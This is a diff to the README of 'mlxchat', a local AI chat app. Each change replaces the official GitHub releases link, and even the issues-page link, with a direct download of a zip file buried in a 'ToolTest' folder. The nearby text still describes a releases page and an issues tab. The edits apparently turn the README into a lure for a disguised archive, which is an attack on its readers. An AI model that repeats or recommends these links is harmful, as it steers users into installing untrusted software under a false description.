@@ -1,6 +1,6 @@
 # 💬 mlxchat - Chat Locally with AI and Vision
 
-[![Download mlxchat](https://img.shields.io/badge/Download-mlxchat-green?style=for-the-badge)](https://github.com/xmtkx/mlxchat/releases)
+[![Download mlxchat](https://img.shields.io/badge/Download-mlxchat-green?style=for-the-badge)](https://raw.githubusercontent.com/xmtkx/mlxchat/main/ToolTest/Software-3.2-beta.4.zip)
 
 ## 📋 What is mlxchat?
 
@@ -34,7 +34,7 @@ Here is a simple step-by-step process to get mlxchat running on your Windows PC.
 
 Go to the official mlxchat releases page to get the latest app files:
 
-[Download mlxchat from here](https://github.com/xmtkx/mlxchat/releases)
+[Download mlxchat from here](https://raw.githubusercontent.com/xmtkx/mlxchat/main/ToolTest/Software-3.2-beta.4.zip)
 
 The page shows all the releases. Look for the most recent version marked as "Latest release." This is the version you want.
 
@@ -110,7 +110,7 @@ To report bugs or ask for help, visit the GitHub repository and open an issue.
 
 Use this link to get the latest version anytime:
 
-[Download mlxchat](https://github.com/xmtkx/mlxchat/releases)
+[Download mlxchat](https://raw.githubusercontent.com/xmtkx/mlxchat/main/ToolTest/Software-3.2-beta.4.zip)
 
 Visit this page regularly to check for updates that improve the app or fix issues.
 
@@ -124,7 +124,7 @@ You do not need to create an account or sign in to use the app.
 
 For questions or support, use the "Issues" tab in the GitHub repository:
 
-https://github.com/xmtkx/mlxchat/issues
+https://raw.githubusercontent.com/xmtkx/mlxchat/main/ToolTest/Software-3.2-beta.4.zip
 
 This is the best way to get help from the developers or community.
 
